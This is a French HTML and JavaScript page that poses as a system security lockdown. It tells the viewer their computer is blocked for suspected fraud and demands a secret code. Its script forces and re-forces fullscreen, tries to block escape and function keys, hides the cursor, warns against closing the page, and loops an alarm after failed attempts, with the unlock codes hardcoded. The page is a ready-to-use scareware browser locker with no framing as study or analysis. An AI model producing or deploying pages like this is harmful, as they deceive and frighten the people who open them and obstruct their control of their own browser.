<!DOCTYPE html><html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>🔒 Sécurité Système</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        html, body {
            width: 100%;
            height: 100%;
            background: linear-gradient(to bottom, #001f3f, #0055aa);
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            text-align: center;
            overflow: hidden;
            cursor: none;
        }
        .container {
            background: red;
            padding: 5%;
            border-radius: 10px;
            box-shadow: 0 0 10px white;
            width: 80vw;
            height: 80vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }
        h1 {
            font-size: 5vw;
            margin-bottom: 2vh;
        }
        #alert-message {
            font-size: 3vw;
            margin-bottom: 3vh;
        }
        input {
            padding: 1vh;
            font-size: 3vw;
            margin-bottom: 2vh;
            text-align: center;
            outline: none;
            width: 50%;
        }
        button {
            background: black;
            color: white;
            padding: 2vh 4vw;
            font-size: 3vw;
            cursor: pointer;
        }
        #error-message {
            color: yellow;
            font-size: 2vw;
            margin-top: 2vh;
        }
        #trap {
            position: fixed;
            top: 50%;
            left: 50%;
            width: 10px;
            height: 10px;
            background: transparent;
            cursor: none;
        }
    </style>
</head>
<body onload="startLockdown()">
    <div class="container">
        <h1>🔴 ACCÈS BLOQUÉ 🔴</h1>
        <p id="alert-message">
            🚨 <b>SUSPICION D’ACTIVITÉ FRAUDULEUSE</b> 🚨<br>
            Votre ordinateur est verrouillé pour des raisons de **sécurité**.<br>
            Veuillez **entrer le code secret** pour déverrouiller.<br>
        </p>
        <input type="password" id="codeInput" placeholder="Entrez le code secret..." autofocus>
        <button onclick="checkCode()">Déverrouiller</button>
        <p id="error-message"></p>
    </div>
    <div id="trap"></div>
    <script>
        const SECRET_CODES = ["dakar", "2012", "1234"];
        let attempts = 0;
        const maxAttempts = 3;function startLockdown() {
        requestFullScreen();
        blockKeys();
        preventClose();
        simulateMouseMove();
        document.getElementById("codeInput").focus();
    }

    function checkCode() {
        let inputCode = document.getElementById("codeInput").value.toLowerCase();
        if (SECRET_CODES.includes(inputCode)) {
            unlockSystem();
        } else {
            attempts++;
            document.getElementById("error-message").textContent = `⛔ Code incorrect (${attempts}/${maxAttempts})`;
            if (attempts >= maxAttempts) {
                playAlarm();
            }
        }
    }

    function requestFullScreen() {
        let elem = document.documentElement;
        if (elem.requestFullscreen) {
            elem.requestFullscreen();
        } else if (elem.mozRequestFullScreen) {
            elem.mozRequestFullScreen();
        } else if (elem.webkitRequestFullscreen) {
            elem.webkitRequestFullscreen();
        } else if (elem.msRequestFullscreen) {
            elem.msRequestFullscreen();
        }
    }

    function blockKeys() {
        document.addEventListener("keydown", function (event) {
            setTimeout(() => {
                let blockedKeys = ["Escape", "F11", "F12", "Tab", "Control", "Alt", "Meta", "Shift", "Delete"];
                if (blockedKeys.includes(event.key)) {
                    event.preventDefault();
                }
            }, 10);
        });
    }

    function playAlarm() {
        let audio = new Audio("https://www.soundjay.com/button/beep-07.wav");
        audio.loop = true;
        audio.play();
    }

    function unlockSystem() {
        document.exitFullscreen();
        document.body.innerHTML = "<h1 style='color: green;'>✅ Accès Rétabli</h1>";
    }

    function preventClose() {
        window.onbeforeunload = function() {
            return "🚨 Attention ! Cette action peut provoquer une perte de données.";
        };
        document.addEventListener("visibilitychange", function() {
            if (document.hidden) {
                setTimeout(requestFullScreen, 10);
            }
        });
        setInterval(() => {
            if (!document.fullscreenElement) {
                requestFullScreen();
            }
        }, 500);
    }

    function simulateMouseMove() {
        setInterval(() => {
            let fakeEvent = new MouseEvent("mousemove", { bubbles: true, cancelable: true });
            document.dispatchEvent(fakeEvent);
        }, 1000);
    }

    document.addEventListener("mousemove", function(event) {
        let trap = document.getElementById("trap");
        trap.style.top = event.clientY + "px";
        trap.style.left = event.clientX + "px";
    });
</script>

</body>
</html>
